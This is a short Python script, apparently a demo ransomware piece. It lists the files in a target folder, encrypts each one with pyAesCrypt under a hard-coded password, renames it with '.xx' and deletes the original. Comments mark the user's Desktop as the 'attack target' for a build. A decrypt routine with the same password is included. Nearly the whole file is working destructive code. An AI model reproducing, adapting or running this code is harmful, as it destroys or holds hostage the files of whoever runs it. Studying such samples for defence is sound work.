# coding:utf-8

import os
import pyAesCrypt

login_user = os.getlogin()

# get desktop path, attack target path, e.g. desktop path
# target_path = r"C:\Users\{}\Desktop".format(login_user)  # use it build
# target_path = r"C:\Users\{}\Desktop\test".format(login_user)  # use it for vm test
target_path = r"D:\ws_python\devdemo\python_demo\test"  # for dev debug
print("[+] attack file path: ", target_path)

file_list = list()


def scanner_file():
    # find current all file
    file = os.listdir(target_path)
    for f in file:
        file_list.append(f)
    # print(file_list)
    return file_list


def encrypt_desktop_file(passwd="Hacking-to-the-Gate"):
    files = scanner_file()
    for file in files:
        # print(f"{target_path}\\{file}")  # print(f"{target_path}\\{file}.xx")
        if os.path.isfile(f"{target_path}\\{file}"):
            try:
                pyAesCrypt.encryptFile(f"{target_path}\\{file}", f"{target_path}\\{file}.xx", passwd)
                os.remove(f"{target_path}\\{file}")  # attention: delete origin file
            except RuntimeError:
                pass

    print("[+] finish encrypt files ...")


def decrypt_desktop_file(passwd="Hacking-to-the-Gate"):
    files = scanner_file()

    for file in files:
        # print(f"{target_path}\\{file}")  # print(f"{target_path}\\{file}.xx")
        if os.path.isfile(f"{target_path}\\{file}"):
            try:
                pyAesCrypt.decryptFile(f"{target_path}\\{file}", f"{target_path}\\{file.replace('.xx', '')}", passwd)
                os.remove(f"{target_path}\\{file}")  # attention: delete origin file
            except RuntimeError:
                pass
    print("[+] finish decrypt files !!!")


if __name__ == '__main__':
    encrypt_desktop_file()
    # decrypt_desktop_file()
